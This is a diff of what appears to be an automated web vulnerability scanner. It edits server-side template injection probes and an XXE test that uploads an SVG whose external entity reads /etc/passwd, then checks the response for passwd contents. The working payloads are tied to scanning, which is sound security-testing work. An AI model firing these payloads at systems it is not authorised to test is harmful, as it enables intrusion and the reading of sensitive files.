@@ -506,7 +506,6 @@ Based on reconnaissance findings, CONSTRUCT optimal tool commands:
                 ("#{7*7}", "49"),
                 ("*{7*7}", "49"),
                 ("{{7*'7'}}", "7777777"),
-                ("{{config}}", "SECRET_KEY"),
             ]
             async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=10) as _ssti_client:
                 for ep in _candidates:
@@ -1045,13 +1044,14 @@ Based on reconnaissance findings, CONSTRUCT optimal tool commands:
             xxe_svg = b'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'''
-            import httpx as _httpx_xxe
             files = {"file": ("xxe.svg", xxe_svg, "image/svg+xml")}
             _headers = {}
             if auth_data and auth_data.get("token"):
                 _headers["Authorization"] = f"Bearer {auth_data['token']}"
-            async with _httpx_xxe.AsyncClient(verify=False, timeout=20) as _c:
-                r = await _c.post(url, files=files, headers=_headers)
+            # Use resolved upload endpoint if available, otherwise fall back to url
+            _svg_target = _upload_ep if _upload_ep else url
+            async with httpx.AsyncClient(verify=False, timeout=20) as _c:
+                r = await _c.post(_svg_target, files=files, headers=_headers)
                 if "root:" in r.text or "/bin/bash" in r.text or "xxe" in r.text.lower():
                     all_findings.setdefault("xxe", []).append({
                         "url": url, "technique": "SVG file upload XXE",
